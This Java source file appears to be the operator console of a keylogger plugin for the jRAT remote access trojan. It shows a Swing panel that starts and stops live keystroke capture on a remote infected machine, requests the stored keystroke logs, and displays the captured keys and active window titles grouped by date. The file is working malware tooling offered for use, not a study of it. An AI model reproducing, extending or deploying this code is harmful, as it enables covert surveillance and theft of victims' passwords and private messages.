package pro.jrat.plugin.client.ui;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataInputStream;
import java.io.DataOutputStream;

import javax.swing.ButtonGroup;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JCheckBox;
import javax.swing.JScrollPane;
import javax.swing.JTextPane;
import javax.swing.JToggleButton;
import javax.swing.JTree;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;

import pro.jrat.api.BaseControlPanel;
import pro.jrat.api.PacketBuilder;
import pro.jrat.api.RATObject;
import pro.jrat.plugin.client.HeartbeatThread;
import pro.jrat.plugin.client.KeyloggerPlugin;


@SuppressWarnings("serial")
public class PanelKeylogger extends BaseControlPanel {
	
	public JTextPane textPane;
	private final ButtonGroup buttonGroup = new ButtonGroup();
	private JCheckBox chckbxDeleteCharOn;
	private Style title;
	private HeartbeatThread hb;
	private JTree tree;

	public PanelKeylogger() {
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		
		JToggleButton tglbtnEnable = new JToggleButton("Enable");
		tglbtnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				hb = new HeartbeatThread(getServer());
				new Thread(hb).start();
			}
		});
		buttonGroup.add(tglbtnEnable);
		
		JToggleButton tglbtnDisable = new JToggleButton("Disable");
		tglbtnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				hb.toggle();
				hb = null;
			}
		});
		buttonGroup.add(tglbtnDisable);
		tglbtnDisable.setSelected(true);
		
		chckbxDeleteCharOn = new JCheckBox("Delete char on backspace");
		
		JScrollPane scrollPane_1 = new JScrollPane();
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(tglbtnEnable)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(tglbtnDisable)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addComponent(chckbxDeleteCharOn)
					.addContainerGap(147, Short.MAX_VALUE))
				.addGroup(Alignment.TRAILING, groupLayout.createSequentialGroup()
					.addGap(1)
					.addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 128, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 315, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(Alignment.TRAILING, groupLayout.createSequentialGroup()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 259, Short.MAX_VALUE)
						.addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 259, Short.MAX_VALUE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(tglbtnEnable)
						.addComponent(tglbtnDisable)
						.addComponent(chckbxDeleteCharOn))
					.addGap(12))
		);
		
		tree = new JTree();
		tree.setShowsRootHandles(true);
		tree.setModel(new DefaultTreeModel(
			new DefaultMutableTreeNode("Dates") {
				{
				}
			}
		));
		scrollPane_1.setViewportView(tree);
		
		textPane = new JTextPane();
		textPane.setEditable(false);
		scrollPane.setViewportView(textPane);
		setLayout(groupLayout);

		title = textPane.addStyle("title", null);
        StyleConstants.setForeground(title, Color.green.darker());
        
        try {
			getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getServer()) {
				@Override
				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
					
				}
			});
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public DefaultMutableTreeNode getRoot() {
		return (DefaultMutableTreeNode) tree.getModel().getRoot();
	}
	
	public synchronized void delete() throws Exception {
		String text = textPane.getText().trim();
		if (text.endsWith("]")) {
			textPane.getStyledDocument().remove(text.lastIndexOf("["), text.lastIndexOf("]") - text.lastIndexOf("[") + 1);
		} else {
			textPane.getStyledDocument().remove(textPane.getDocument().getLength() - 1, 1);
		}
	}
	
	public synchronized void append(String key) {
		try {
			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
				delete();
				return;
			} else if (key.startsWith("[Window")) {
				textPane.getStyledDocument().insertString(textPane.getStyledDocument().getLength(), "\n\r" + key + "\n\r", title);
			} else {
				textPane.getStyledDocument().insertString(textPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
			}
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		textPane.setSelectionStart(textPane.getDocument().getLength());
		textPane.setSelectionEnd(textPane.getDocument().getLength());	

	}

	@Override
	public void onClose() {
		
	}

	public JTree getTree() {
		return tree;
	}
}
